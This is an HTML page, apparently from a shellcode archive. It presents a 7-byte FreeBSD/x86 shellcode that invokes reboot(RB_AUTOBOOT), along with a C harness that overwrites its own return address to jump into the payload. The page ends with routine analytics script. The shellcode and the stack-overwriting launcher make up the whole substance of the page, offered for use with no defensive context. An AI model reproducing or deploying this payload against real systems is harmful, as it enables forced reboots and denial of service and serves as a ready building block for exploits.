<html><head><title>FreeBSD/x86 - reboot(RB_AUTOBOOT) - 7 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 *
 * FreeBSD_x86-reboot-7b.c (Shellcode, reboot(RB_AUTOBOOT), 7 bytes)
 *
 * by IZ &lt; guerrilla.sytes.net &gt;
 *
 */


char shellcode[] =
&quot;\x31\xc0&quot;                  /* xor %eax,%eax */

&quot;\x50&quot;                      /* push %eax */
&quot;\xb0\x37&quot;                  /* mov $0x37,%al */
&quot;\xcd\x80&quot;;                 /* int $0x80 */


void main()
{
     int*     ret;         

     ret = (int*) &amp;ret + 2;

     printf(&quot;len %d\n&quot;,strlen(shellcode));

     (*ret) = (int) shellcode; 
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
